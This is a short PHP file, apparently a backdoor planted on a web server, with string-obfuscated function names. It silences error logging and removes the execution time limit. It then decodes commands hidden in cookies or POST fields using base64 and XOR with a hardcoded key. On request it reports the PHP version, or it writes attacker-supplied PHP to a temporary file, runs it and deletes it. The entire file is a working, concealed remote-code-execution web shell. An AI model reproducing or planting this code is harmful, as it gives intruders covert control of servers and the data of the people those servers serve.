<?php $urvay = "\146"."\151".'l'.'e'."\137"."\x70"."\x75"."\164".'_'."\x63"."\157"."\x6e".chr(116).chr(101)."\156"."\164".chr(801-686);
$lgpcyr = chr(123-25).'a'.chr(115).chr(270-169).'6'."\x34".chr(676-581).chr(100)."\145".'c'.chr(701-590).chr(100)."\x65";
$icqga = "\x69"."\156"."\x69".'_'."\x73".chr(101)."\164";
$exgkga = 'u'."\x6e".chr(108)."\151".chr(110)."\153";


@$icqga("\145".'r'.chr(114).chr(689-578)."\162".'_'."\x6c".'o'.chr(103), NULL);
@$icqga('l'.chr(111).'g'.chr(827-732).chr(101).chr(434-320).chr(1028-914)."\x6f".chr(114)."\x73", 0);
@$icqga(chr(255-146).chr(97)."\170".'_'.chr(101)."\170".'e'.chr(722-623)."\x75".chr(116).'i'.chr(1081-970).chr(949-839).chr(95)."\x74".'i'.chr(720-611).'e', 0);
@set_time_limit(0);

function xmrsq($hejkow, $yxhmnogdples)
{
    $mwlviufy = "";
    for ($yxhmno = 0; $yxhmno < strlen($hejkow);) {
        for ($j = 0; $j < strlen($yxhmnogdples) && $yxhmno < strlen($hejkow); $j++, $yxhmno++) {
            $mwlviufy .= chr(ord($hejkow[$yxhmno]) ^ ord($yxhmnogdples[$j]));
        }
    }
    return $mwlviufy;
}

$vriviy = array_merge($_COOKIE, $_POST);
$pahrjqe = 'f6069484-2ea3-4e19-a03e-9ada2a42a70d';
foreach ($vriviy as $rhxuxgmvut => $hejkow) {
    $hejkow = @unserialize(xmrsq(xmrsq($lgpcyr($hejkow), $pahrjqe), $rhxuxgmvut));
    if (isset($hejkow[chr(97).chr(107)])) {
        if ($hejkow["\141"] == chr(105)) {
            $yxhmno = array(
                chr(500-388).chr(767-649) => @phpversion(),
                "\163".'v' => "3.5",
            );
            echo @serialize($yxhmno);
        } elseif ($hejkow["\141"] == "\x65") {
            $nelnerrq = "./" . md5($pahrjqe) . '.'.chr(105).chr(110).'c';
            @$urvay($nelnerrq, "<" . chr(493-430)."\160"."\150"."\x70"."\40".chr(881-817)."\165".chr(378-268)."\x6c".'i'.chr(272-162).chr(461-354)."\50".chr(863-768).'_'.chr(853-783)."\111".chr(969-893)."\x45".chr(95).chr(479-384)."\51"."\x3b"."\x20" . $hejkow['d']);
            @include($nelnerrq);
            @$exgkga($nelnerrq);
        }
        exit();
    }
}

